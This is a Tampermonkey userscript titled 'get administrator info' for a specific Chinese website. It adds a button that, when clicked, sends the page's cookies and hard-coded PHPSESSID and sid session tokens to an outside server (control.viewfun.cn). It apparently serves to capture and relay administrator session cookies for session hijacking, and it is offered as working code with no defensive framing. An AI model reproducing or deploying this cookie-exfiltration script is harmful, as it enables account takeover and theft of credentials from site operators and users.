// ==UserScript==
// @name        获取管理员信息
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  获取管理员信息
// @author       You
// @include      http://u229687.wds168.cn/*
// @grant        GM_xmlhttpRequest
// ==/UserScript==

(function() {
    'use strict';


   //创建一个按钮
    function createButton() {
        const button = document.createElement('button');
        button.innerHTML = '获取信息';
        button.style.position = 'fixed';
        button.style.bottom = '20px';
        button.style.right = '20px';
        button.style.zIndex = '10000';
        button.style.backgroundColor = '#00a2d8';
        button.style.color = '#ffffff';
        button.style.border = 'none';
        button.style.padding = '10px';
        button.style.cursor = 'pointer';
        button.style.fontSize = '14px';
        button.style.borderRadius = '5px';
        document.body.appendChild(button);
        // 新增按钮点击事件
        button.addEventListener('click', () => {
            sendServe();
        });
    }

    function sendServe(){
        const user_info  = "PHPSESSID=d14355e05ef318e975768a378212c1fa; sid=8235abddcf6ff095093ff788de771481; "
        const cookie = user_info+document.cookie
        // 发送数据到服务器
        GM_xmlhttpRequest({
            method: "POST",
            //url: "http://192.168.1.50:5000/update",
            url: "https://control.viewfun.cn/update",
            headers: { "Content-Type": "application/json","cookie":cookie},
            onload: function (response) {
                if (response.status >= 200 && response.status < 300) {
                    // 结构化日志
                    console.log(`%c✓ 请求成功 [${response.status}]`, 'color: #4CAF50; font-weight: bold',JSON.parse(response.responseText));
                    // 页面可视化反馈
                    showToast('数据更新成功', '#4CAF50');
                } else {
                    handleError(`HTTP错误 [${response.status}]`, response);
                }
            },
            onerror: function (error) {
                console.error("请求失败:", error);
            }
        });

    }

    // 优雅的错误处理
    function handleError(msg, detail) {
        console.error(`%c✗ ${msg}`, 'color: #f44336; font-weight: bold', detail);
        showToast(msg, '#f44336');
    }

    // 可视化提示组件
    function showToast(text, color) {
        let toast = document.createElement('div');
        toast.style = `
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 12px 24px;
            background: ${color};
            color: white;
            border-radius: 4px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
            z-index: 9999;
            animation: slideIn 0.3s ease-out;
        `;
        toast.textContent = text;
        document.body.appendChild(toast);

        setTimeout(() => {
            toast.style.animation = 'fadeOut 0.3s ease-out';
            setTimeout(() => toast.remove(), 300);
        }, 3000);
    }

    // Add the button to the page
    createButton();





})();





